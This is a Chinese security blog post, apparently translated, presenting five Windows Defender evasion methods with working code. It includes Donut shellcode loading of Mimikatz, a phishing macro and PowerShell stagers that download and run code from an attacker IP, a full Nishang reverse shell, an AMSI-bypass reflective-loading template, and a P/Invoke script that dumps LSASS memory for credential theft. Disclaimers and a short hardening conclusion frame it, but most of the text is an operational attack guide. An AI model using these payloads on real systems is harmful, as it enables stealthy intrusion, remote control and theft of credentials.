#  Bypass Windows Defender的十种方式 0x2

安全小白团译文  [ 安全小白团 ](javascript:void\(0\);)

**安全小白团** ![]()

微信号 noobsec

功能介绍 小白学习基地，教你网络安全如何从入门到放弃

____

___发表于_

收录于合集 #红蓝技术 12个

前面《[Bypass Windows Defender的十种方式
0x1](http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247485286&idx=1&sn=9f8e1399b0af14b2d3231674df69690a&chksm=fc9818eccbef91fa85d06066e7665e0b354d09c37c115bd01f540a52a365e4165270d634e660&scene=21#wechat_redirect)》介绍了5种
Bypass Windows Defender的方式，今天继续介绍剩下的5种。

  

免责声明：本文中提供的信息仅用于教育和道德目的。所描述的技术和工具旨在以合法和负责任的方式使用，并获得目标系统所有者的明确同意。严禁未经授权或恶意使用这些技术和工具，否则可能导致法律后果。对于因滥用所提供的信息而可能引起的任何损害或法律问题，我概不负责。

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230621095455.png)

 **06 利用** **Donut进行shellcode加载**

  

TheWover 的 Donut 项目是一个可以在内存中执行 VBScript、JScript、EXE、DLL 文件的
shellcode加载器。根据给定的输入文件，它以不同的方式工作。对于这个 PoC，我将使用
Mimikatz，所以让我们看看它是如何在高层次上工作的。简单看一下代码，这就是 Donut.exe 可执行工具的主要例程：  

  * 

    
    
    https://github.com/thewover/donut
    
          *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
    // 1. validate the loader configurationerr = validate_loader_cfg(c);if(err == DONUT_ERROR_OK) {// 2. get information about the file to execute in memory  err = read_file_info(c);  if(err == DONUT_ERROR_OK) {    // 3. validate the module configuration    err = validate_file_cfg(c);    if(err == DONUT_ERROR_OK) {      // 4. build the module      err = build_module(c);      if(err == DONUT_ERROR_OK) {        // 5. build the instance        err = build_instance(c);        if(err == DONUT_ERROR_OK) {          // 6. build the loader          err = build_loader(c);          if(err == DONUT_ERROR_OK) {            // 7. save loader and any additional files to disk            err = save_loader(c);          }        }      }    }  }}// if there was some error, release resourcesif(err != DONUT_ERROR_OK) {  DonutDelete(c);}

  
在所有这些中，也许最有趣的是 build_loader，它包含以下代码：  

    
          *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
    uint8_t *pl;uint32_t t;  
    // target is x86?if(c->arch == DONUT_ARCH_X86) {  c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;} else// target is amd64?if(c->arch == DONUT_ARCH_X64) {  c->pic_len = sizeof(LOADER_EXE_X64) + c->inst_len + 32;} else// target can be both x86 and amd64?if(c->arch == DONUT_ARCH_X84) {  c->pic_len = sizeof(LOADER_EXE_X86) +  sizeof(LOADER_EXE_X64) + c->inst_len + 32;}// allocate memory for shellcodec->pic = malloc(c->pic_len);  
    if(c->pic == NULL) {  DPRINT("Unable to allocate %" PRId32 " bytes of memory for loader.", c->pic_len);  return DONUT_ERROR_NO_MEMORY;}  
    DPRINT("Inserting opcodes");  
    // insert shellcodepl = (uint8_t*)c->pic;  
    // call $ + c->inst_lenPUT_BYTE(pl, 0xE8);PUT_WORD(pl, c->inst_len);PUT_BYTES(pl, c->inst, c->inst_len);// pop ecxPUT_BYTE(pl, 0x59);  
    // x86?if(c->arch == DONUT_ARCH_X86) {  // pop edx  PUT_BYTE(pl, 0x5A);  // push ecx  PUT_BYTE(pl, 0x51);  // push edx  PUT_BYTE(pl, 0x52);    DPRINT("Copying %" PRIi32 " bytes of x86 shellcode",  (uint32_t)sizeof(LOADER_EXE_X86));    PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));} else// AMD64?if(c->arch == DONUT_ARCH_X64) {  
      DPRINT("Copying %" PRIi32 " bytes of amd64 shellcode",  (uint32_t)sizeof(LOADER_EXE_X64));  
      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention    // and rsp, -0x10  PUT_BYTE(pl, 0x48);  PUT_BYTE(pl, 0x83);  PUT_BYTE(pl, 0xE4);  PUT_BYTE(pl, 0xF0);  // push rcx  // this is just for alignment, any 8 bytes would do  PUT_BYTE(pl, 0x51);    PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));} else// x86 + AMD64?if(c->arch == DONUT_ARCH_X84) {  
      DPRINT("Copying %" PRIi32 " bytes of x86 + amd64 shellcode",  (uint32_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));  
      // xor eax, eax  PUT_BYTE(pl, 0x31);  PUT_BYTE(pl, 0xC0);  // dec eax  PUT_BYTE(pl, 0x48);  // js dword x86_code  PUT_BYTE(pl, 0x0F);  PUT_BYTE(pl, 0x88);  PUT_WORD(pl, sizeof(LOADER_EXE_X64) + 5);    // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention    // and rsp, -0x10  PUT_BYTE(pl, 0x48);  PUT_BYTE(pl, 0x83);  PUT_BYTE(pl, 0xE4);  PUT_BYTE(pl, 0xF0);  // push rcx  // this is just for alignment, any 8 bytes would do  PUT_BYTE(pl, 0x51);    PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));  // pop edx  PUT_BYTE(pl, 0x5A);  // push ecx  PUT_BYTE(pl, 0x51);  // push edx  PUT_BYTE(pl, 0x52);  PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));}return DONUT_ERROR_OK;

同样，从简短的分析来看，该子例程基于原始可执行文件创建/准备与位置无关的 shellcode
以供以后注入，插入汇编指令以根据每个体系结构对齐堆栈，并使代码流跳转到可执行文件的原始
shellcode。请注意，这可能不是最新的代码，因为该文件的最后一次提交是在 2022 年 12 月，最新版本是在 2023 年 3
月，但它很好地说明了它的工作原理。  
最后，进入本节的概念证明，我将通过将 shellcode 注入本地 poweshell 进程来执行直接从 gentilkiwi 存储库获取的默认
Mimikatz。为此，我们需要先生成 PI 代码。  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095456.png)  
生成 shellcode
后，我们现在可以使用我们喜欢的任何注入器来达到此目的。幸运的是，最新版本已经带有一个本地（用于执行它的进程）和一个远程（用于另一个进程）注入器，Microsoft尚未检测到特征，因此我将使用它。  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095457.png)  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230621095455.png)

 **07  定制工具**

  
Mimikatz、Rubeus、Certify、PowerView、BloodHound
等工具之所以受欢迎是有原因的：它们在一个包中实现了很多功能。这对恶意行为者非常有用，因为他们只需要几个工具就可以自动传播恶意软件。然而，这些工具的流行也意味着供应商很容易通过特征码来检测它们。  
  
为了解决这个问题，也许我们不需要一个2-5MB的工具来完成我们需要的一两个功能。例如，为了转储登录密码/哈希，我们可以利用带有
sekurlsa::logonpasswords 函数的整个 Mimikatz 项目，但我们也可以以完全不同但具有相似行为和 API
调用的方式编写我们自己的 LSASS 转储器和解析器。  
对于第一个示例，我将使用Cracked5pider 的 LsaParser。  

  * 

    
    
    https://github.com/Cracked5pider/LsaParser

LsaParser
执行![](https://gitee.com/fuli009/images/raw/master/public/20230621095459.png)  
不幸的是，它不是为 Windows Server 开发的，所以我不得不在本地 Windows 10
上使用它，但你应该能明白这张图要表达的意思，它没有被检测到。  
对于第二个示例，假设我们的目标是枚举整个 AD 域中的共享。为此，我们可以使用 PowerView 的 Find-
DomainShare，但是，它是最著名的开源工具之一，因此，为了更加隐蔽，我们可以基于本机 Windows API 开发自己的共享查找器工具，如下所示。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    RemoteShareEnum.cpp#include <windows.h>#include <stdio.h>#include <lm.h>  
    #pragma comment(lib, "Netapi32.lib")  
    int wmain(DWORD argc, WCHAR* lpszArgv[]){  
        PSHARE_INFO_502 BufPtr, p;    PSHARE_INFO_1 BufPtr2, p2;    NET_API_STATUS res;    LPTSTR   lpszServer = NULL;    DWORD er = 0, tr = 0, resume = 0, i,denied=0;    switch (argc)    {    case 1:        wprintf(L"Usage : RemoteShareEnum.exe <servername1> <servername2> <servernameX>\n");        return 1;  
        default:        break;    }    wprintf(L"\n Share\tPath\tDescription\tCurrent Users\tHost\n\n");    wprintf(L"-------------------------------------------------------------------------------------\n\n");    for (DWORD iter = 1; iter <= argc-1; iter++) {        lpszServer = lpszArgv[iter];        do        {            res = NetShareEnum(lpszServer, 502, (LPBYTE*)&BufPtr, -1, &er, &tr, &resume);            if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA)            {                p = BufPtr;                for (i = 1; i <= er; i++)                {                    wprintf(L" % s\t % s\t % s\t % u\t % s\t\n", p->shi502_netname, p->shi502_path, p->shi502_remark, p->shi502_current_uses, lpszServer);                    p++;                }                NetApiBufferFree(BufPtr);            }            else if (res == ERROR_ACCESS_DENIED) {                denied = 1;            }            else            {                wprintf(L"NetShareEnum() failed for server '%s'. Error code: % ld\n",lpszServer, res);            }        }        while (res == ERROR_MORE_DATA);        if (denied == 1) {            do            {                res = NetShareEnum(lpszServer, 1, (LPBYTE*)&BufPtr2, -1, &er, &tr, &resume);                if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA)                {                    p2 = BufPtr2;                    for (i = 1; i <= er; i++)                    {                        wprintf(L" % s\t % s\t % s\t\n", p2->shi1_netname, p2->shi1_remark,  lpszServer);                        p2++;                    }  
                        NetApiBufferFree(BufPtr2);                }                else                {                    wprintf(L"NetShareEnum() failed for server '%s'. Error code: % ld\n", lpszServer, res);                }  
                }            while (res == ERROR_MORE_DATA);            denied = 0;        }  
            wprintf(L"-------------------------------------------------------------------------------------\n\n");    }    return 0;  
    }

该工具利用 Win32 API 中的 NetShareEnum 函数远程检索从任何输入端点提供的共享。默认情况下，它会尝试特权 SHARE_INFO_502
访问级别，显示一些额外信息，如磁盘路径、连接数等。如果失败，它会回退到访问级别
SHARE_INFO_1，它仅显示资源名称但任何非特权用户都可以枚举它(除非特定的ACL阻止它)。请随意使用此处提供的工具。  

  * 

    
    
    https://github.com/florylsk/RemoteShareEnum

现在，我们可以像下面这样使用它：  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095501.png)  
当然，定制工具可能是一项非常耗时的任务，并且需要有非常深入的 Windows
内部知识，但它有可能击败本文中介绍的所有其他方法。因此，如果其他一切方法都失败了，应该考虑到这一点。也就是说，我仍然认为它更适合 EDR
规避，因为您可以控制并包括您自己选择的 API 调用、断点、顺序、垃圾数据/指令、混淆等。  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230621095455.png)

 **08  Payload 分段（Staging）**

  
将有效载荷分阶段执行不是新技术，攻击者通常使用它来传播恶意软件，从而逃避初始静态分析。这是因为真正的恶意负载将在稍后阶段被检索和执行，此时静态分析可能没有机会发挥作用。  
  
对于此 PoC，我将展示一种非常简单但有效的方法来分阶段执行反向 shell Payload，例如，使用以下宏创建恶意Office文件:  

    
          *   *   * 
    
    
    
    Sub AutoOpen()Set shell_object = CreateObject("WScript.Shell")shell_object.Exec ("powershell -c IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/stage1.ps1')")End Sub

  
当然，这不会被 AV 静态检测到，因为它只是在执行一个看似良性的命令。  
由于我没有安装 Office，我将通过在 PowerShell 脚本中手动执行上述命令来模拟网络钓鱼过程。  
最后，本节的 PoC 如下：  
stage0.txt（这将是在网络钓鱼宏中执行的命令）

    
    
      
    
    
      * 
    
    
    
    IEX(New-Object Net.WebClient).downloadString("http://172.31.17.142:8080/stage1.txt")

stage1.txt  

    
    
      
    
    
      *   * 
    
    
    
    IEX(New-Object Net.WebClient).downloadString("http://172.31.17.142:8080/ref.txt")IEX(New-Object Net.WebClient).downloadString("http://172.31.17.142:8080/stage2.txt")

  
stage2.txt  
  

    
          *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
    function Invoke-PowerShellTcp { <#.SYNOPSISNishang script which can be used for Reverse or Bind interactive PowerShell from a target.   
    .DESCRIPTIONThis script is able to connect to a standard netcat listening on a port when using the -Reverse switch. Also, a standard netcat can connect to this script Bind to a specific port.  
    The script is derived from Powerfun written by Ben Turner & Dave Hardy  
    .PARAMETER IPAddressThe IP address to connect to when using the -Reverse switch.  
    .PARAMETER PortThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.  
    .EXAMPLEPS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444  
    Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port.   
    .EXAMPLEPS > Invoke-PowerShellTcp -Bind -Port 4444  
    Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.   
    .EXAMPLEPS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444  
    Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must belistening on the given IP and port.   
    .LINKhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.htmlhttps://github.com/nettitude/powershell/blob/master/powerfun.ps1https://github.com/samratashok/nishang#>          [CmdletBinding(DefaultParameterSetName="reverse")] Param(  
            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]        [String]        $IPAddress,  
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]        [Int]        $Port,  
            [Parameter(ParameterSetName="reverse")]        [Switch]        $Reverse,  
            [Parameter(ParameterSetName="bind")]        [Switch]        $Bind  
        )  
            try     {        #Connect back if the reverse switch is used.        if ($Reverse)        {            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)        }  
            #Bind to the provided port if Bind switch is used.        if ($Bind)        {            $listener = [System.Net.Sockets.TcpListener]$Port            $listener.start()                $client = $listener.AcceptTcpClient()        }   
            $stream = $client.GetStream()        [byte[]]$bytes = 0..65535|%{0}  
            #Send back current username and computername        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")        $stream.Write($sendbytes,0,$sendbytes.Length)  
            #Show an interactive PowerShell prompt        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')        $stream.Write($sendbytes,0,$sendbytes.Length)  
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)        {            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding            $data = $EncodedText.GetString($bytes,0, $i)            try            {                #Execute the command on the target.                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )            }            catch            {                Write-Warning "Something went wrong with execution of command on the target."                 Write-Error $_            }            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '            $x = ($error[0] | Out-String)            $error.clear()            $sendback2 = $sendback2 + $x  
                #Return the results            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)            $stream.Write($sendbyte,0,$sendbyte.Length)            $stream.Flush()          }        $client.Close()        if ($listener)        {            $listener.Stop()        }    }    catch    {        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."         Write-Error $_    }}  
    Invoke-PowerShellTcp -Reverse -IPAddress 172.31.17.142 -Port 80

  

这里有几件事要注意。首先，ref.txt 是一个简单的 PowerShell AMSI 绕过，它允许我们为当前的 PowerShell 进程修补内存中
AMSI 扫描。此外，在这种情况下，PowerShell 脚本的扩展名无关紧要，因为它们的内容将作为文本简单地下载并使用 Invoke-
Expression（IEX 的别名）调用。  
然后我们可以执行完整的 PoC，如下所示：  
在我们的受害者中执行Stage 0  
![]()  
受害者从我们的 C2 下载stages  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095503.png)  
在我们的攻击者服务器中获取反向 shell。  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095505.png)  
  

![](https://gitee.com/fuli009/images/raw/master/public/20230621095455.png)

 **09  反射加载**

  
您可能还记得第一部分《[Bypass Windows Defender的十种方式
0x1](http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247485286&idx=1&sn=9f8e1399b0af14b2d3231674df69690a&chksm=fc9818eccbef91fa85d06066e7665e0b354d09c37c115bd01f540a52a365e4165270d634e660&scene=21#wechat_redirect)》，我们在修补内存中的
AMSI 后执行了 Mimikatz，以证明 绕过 Defender 的演示。这是因为 .NET 公开了
System.Reflection.Assembly API，我们可以使用它在内存中反射加载和执行 .NET
程序集（定义为“表示一个程序集，它是公共语言运行时应用程序的可重用、可版本控制和自描述构建块。”）。  
这当然对于攻击目的非常有用，因为 PowerShell 使用 .NET，我们可以在脚本中使用它在内存中加载整个二进制文件，以绕过 Windows
Defender 擅长的静态分析。  
脚本的一般结构如下：  
反射加载模板  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    function Invoke-YourTool{    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("yourbase64stringhere"))    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)    $output = New-Object System.IO.MemoryStream    $decompressed.CopyTo( $output )    [byte[]] $byteOutArray = $output.ToArray()    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)  
        $OldConsoleOut = [Console]::Out    $StringWriter = New-Object IO.StringWriter    [Console]::SetOut($StringWriter)  
        [ClassName.Program]::main([string[]]$args)  
        [Console]::SetOut($OldConsoleOut)    $Results = $StringWriter.ToString()    $Results  }
    
    
      
    

Gzip 仅用于尝试隐藏真正的二进制文件，因此有时它可能无需进一步的绕过方法即可工作，但最重要的一行是从
System.Reflection.Assembly .NET 类调用 Load
函数以将二进制文件加载到内存中。之后，我们可以简单地用“[ClassName.Program]::main([string[]]$args)”调用它的主函数  
因此，我们可以执行以下杀伤链来执行我们想要的任何二进制文件：  

  * AMSI/ETW 补丁。
  * 反射加载并执行程序集。

  
幸运的是，这个 repo不仅包含每个著名工具的大量预构建脚本，还包含从二进制文件创建您自己的脚本的说明。  

  * 

    
    
    https://github.com/S3cur3Th1sSh1t/PowerSharpPack

对于这个 PoC，我将执行 Mimikatz，但你可以随意使用任何其他工具。  
反射加载 Mimikatz。  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095508.png)  
请注意，如前所述，某些二进制文件可能不需要绕过 AMSI，具体取决于您在脚本中应用的二进制文件的字符串表示形式。但由于 Invoke-Mimikatz
广为人知，因此我需要在本示例中执行此操作。  
  

![](https://gitee.com/fuli009/images/raw/master/public/20230621095455.png)

 **10  P/Invoke C#程序集**

  
P/Invoke 或 Platform Invoke 允许我们从非托管的本机 Windows DLL 访问结构、回调和函数，以便访问可能无法直接从 .NET
获得的本机组件中的较低级别 API。（类似的功能，JAVA中叫JNI）  
  
现在，由于我们知道它的作用，并且知道我们可以在 PowerShell 中使用 .NET，这意味着我们可以从 PowerShell 脚本访问低级
API，如果我们之前修补了 AMSI，我们可以在没有 Defender 监视的情况下运行该脚本。  
对于这个概念证明，假设我们想通过 MiniDumpWriteDump 将 LSASS
进程转储到文件中，该文件在“Dbghelp.dll”中可用。为此，我们可以利用fortra 的 nanodump 工具。但是，Microsoft
有一堆该工具的特征码。相反，我们可以利用 P/Invoke 编写一个 PowerShell 脚本来执行相同的操作，但我们可以修补 AMSI
以使其在这样做时变得不可检测。  

  * 

    
    
    https://github.com/fortra/nanodump

因此，我将为 PoC 使用以下 PS 代码。  
MiniDumpWriteDump.ps  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    Add-Type @"    using System;    using System.Runtime.InteropServices;  
        public class MiniDump {        [DllImport("Dbghelp.dll", SetLastError=true)]        public static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);    }"@  
    $PROCESS_QUERY_INFORMATION = 0x0400$PROCESS_VM_READ = 0x0010$MiniDumpWithFullMemory = 0x00000002  
    Add-Type -TypeDefinition @"    using System;    using System.Runtime.InteropServices;  
        public class Kernel32 {        [DllImport("kernel32.dll", SetLastError=true)]        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);        [DllImport("kernel32.dll", SetLastError=true)]        public static extern bool CloseHandle(IntPtr hObject);    }"@  
    $processId ="788"  
    $processHandle = [Kernel32]::OpenProcess($PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ, $false, $processId)  
    if ($processHandle -ne [IntPtr]::Zero) {    $dumpFile = [System.IO.File]::Create("C:\users\public\test1234.txt")    $fileHandle = $dumpFile.SafeFileHandle.DangerousGetHandle()  
        $result = [MiniDump]::MiniDumpWriteDump($processHandle, $processId, $fileHandle, $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)  
        if ($result) {        Write-Host "Sucess"    } else {        Write-Host "Failed" -ForegroundColor Red    }  
        $dumpFile.Close()    [Kernel32]::CloseHandle($processHandle)} else {    Write-Host "Failed to open process handle." -ForegroundColor Red}

在此示例中，我们首先通过 Add-Type 从 Dbghelp.dll 导入 MiniDumpWriteDump 函数，然后从 kernel32.dll
导入 OpenProcess 和 CloseHandle。然后最终得到 LSASS 进程的句柄，并使用 MiniDumpWriteDump
执行进程的完整内存转储并将其写入文件。  
因此，完整的 PoC 如下：  
执行 LSASS 转储  
![]()  
使用 impacket-smbclient 下载转储  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095511.png)  
使用 pypykatz 在本地解析 MiniDump 文件  
![](https://gitee.com/fuli009/images/raw/master/public/20230621095512.png)  
请注意，最后我使用了一个稍微修改过的脚本，该脚本在将转储写入文件之前将其加密为 base64，因为 Defender 会将文件检测为 LSASS
转储并将其删除。  
  

###  **结论**

###  

###  尽管如此，我并不是要揭露 Defender
或说它是一个糟糕的防病毒解决方案。事实上，它可能是市场上可用的最佳技术之一，并且这里的大多数技术都适用于大多数供应商。

  

最后，你永远不应该依赖 AV 或 EDR
作为抵御威胁行为者的第一道防线，而应该加强基础设施，这样即使端点解决方案被绕过，你也可以将潜在的损害降到最低。例如强权限系统、GPO、ASR规则、受控访问、进程加固、CLM、AppLocker等。  
  

参考及来源：

https://www.fo-sec.com/articles/10-defender-bypass-methods

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230621095455.png)

 ****

 **11  免责&版权声明**

  

安全小白团是帮助用户了解信息安全技术、安全漏洞相关信息的微信公众号。安全小白团提供的程序(方法)可能带有攻击性，仅供安全研究与教学之用，用户将其信息做其他用途，由用户承担全部法律及连带责任，安全小白团不承担任何法律及连带责任。欢迎大家转载，转载请注明出处。如有侵权烦请告知，我们会立即删除并致歉。谢谢！

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

